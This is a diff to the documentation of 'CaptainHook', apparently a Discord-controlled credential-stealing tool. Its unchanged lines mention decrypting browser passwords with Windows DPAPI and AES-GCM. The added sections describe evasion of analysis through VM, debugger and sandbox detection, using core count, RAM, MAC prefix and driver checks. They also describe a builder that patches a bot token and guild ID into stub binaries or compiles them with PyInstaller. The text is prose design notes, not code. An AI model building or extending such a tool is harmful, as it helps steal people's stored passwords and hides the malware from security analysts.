@@ -58,3 +58,32 @@ To add a feature, create a new module and register it in `src/client/main.py`.
 
 - **Credential Injection:** The Architect Builder performs "Static Injection" during the build process, replacing placeholders in the source code with your actual credentials.
 - **Data Protection:** Browser passwords are decrypted on the fly using **Windows DPAPI** and **AES-GCM**, ensuring that no raw decryption keys are ever stored on disk.
+
+---
+
+## 5. Anti-Analysis & Security
+
+CaptainHook implements several layers of protection to detect and avoid analysis environments:
+
+- **VM Detection:**
+  - CPU Core Count check (rejects < 2 cores).
+  - RAM Total check (rejects < 4GB).
+  - MAC Address prefix check (detects VirtualBox, VMware, Xen, Hyper-V).
+  - File/Driver check (searches for VBoxGuest, vmtoolsd, etc.).
+- **Debugger Detection:** Uses OS-specific APIs (e.g., `IsDebuggerPresent` on Windows) to detect attached debuggers.
+- **Sandbox Detection:** Checks for common sandbox usernames and hostnames.
+
+---
+
+## 6. Architect Builder Logic
+
+The builder uses two main strategies to deliver binaries:
+
+1.  **Instant Stub Patching (Fast):**
+    - The builder searches for pre-compiled "Stub" binaries in the `/stubs` folder.
+    - It performs a binary search-and-replace for `TOKEN_PLACEHOLDER_64_BYTES` and `GUILD_ID_PLACEHOLDER_32_BYTES`.
+    - This allows generating a custom bot in under 1 second.
+2.  **Staged Compilation (Full):**
+    - If no stub is found, it copies the `src/` directory to a `build_staging` folder.
+    - It injects configuration directly into the Python source.
+    - It uses `PyInstaller` to bundle the entire environment into a single, standalone executable.
